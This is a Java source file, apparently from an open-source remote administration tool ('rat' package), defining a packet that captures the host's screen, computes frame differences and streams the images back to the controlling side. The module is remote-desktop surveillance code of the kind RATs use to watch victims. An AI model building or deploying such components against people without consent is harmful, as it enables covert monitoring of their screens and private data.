/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.packet;

import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.stream.Stream;

import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.FrameEncoder;
import de.sogomn.rat.util.FrameEncoder.Frame;

public final class DesktopPacket extends AbstractPingPongPacket {
	
	private Frame[] frames;
	private int screenWidth, screenHeight;
	
	private byte deleteLastScreenshot;
	
	private static BufferedImage lastScreenshot;
	
	private static final byte KEEP = 0;
	private static final byte DELETE = 1;
	
	private static final byte INCOMING = 1;
	private static final byte END = 0;
	
	public DesktopPacket(final boolean delete) {
		type = REQUEST;
		deleteLastScreenshot = delete ? DELETE : KEEP;
	}
	
	public DesktopPacket() {
		this(false);
	}
	
	@Override
	protected void sendRequest(final ActiveConnection connection) {
		connection.writeByte(deleteLastScreenshot);
	}
	
	@Override
	protected void sendData(final ActiveConnection connection) {
		Stream.of(frames).forEach(frame -> {
			final byte[] data = ImageUtils.toByteArray(frame.image, 0);
			
			connection.writeByte(INCOMING);
			connection.writeShort((short)frame.x);
			connection.writeShort((short)frame.y);
			connection.writeInt(data.length);
			connection.write(data);
		});
		
		connection.writeByte(END);
		connection.writeInt(screenWidth);
		connection.writeInt(screenHeight);
	}
	
	@Override
	protected void receiveRequest(final ActiveConnection connection) {
		deleteLastScreenshot = connection.readByte();
	}
	
	@Override
	protected void receiveData(final ActiveConnection connection) {
		final ArrayList<Frame> framesList = new ArrayList<Frame>();
		
		while (connection.readByte() == INCOMING) {
			final int x = connection.readShort();
			final int y = connection.readShort();
			final int length = connection.readInt();
			final byte[] data = new byte[length];
			
			connection.read(data);
			
			final BufferedImage image = ImageUtils.toImage(data);
			final Frame frame = new Frame(x, y, image);
			
			framesList.add(frame);
		}
		
		frames = framesList.stream().toArray(Frame[]::new);
		screenWidth = connection.readInt();
		screenHeight = connection.readInt();
	}
	
	@Override
	protected void executeRequest(final ActiveConnection connection) {
		final BufferedImage screenshot = FrameEncoder.captureScreen();
		final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
		
		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
			final Frame frame = new Frame(0, 0, screenshot);
			
			frames = new Frame[1];
			frames[0] = frame;
		} else if (deleteLastScreenshot == KEEP) {
			frames = FrameEncoder.getIFrames(lastScreenshot, screenshot);
		} else {
			frames = new Frame[0];
		}
		
		type = DATA;
		screenWidth = screenSize.width;
		screenHeight = screenSize.height;
		lastScreenshot = screenshot;
		
		connection.addPacket(this);
	}
	
	@Override
	protected void executeData(final ActiveConnection connection) {
		//...
	}
	
	public Frame[] getFrames() {
		return frames;
	}
	
	public int getScreenWidth() {
		return screenWidth;
	}
	
	public int getScreenHeight() {
		return screenHeight;
	}
	
}
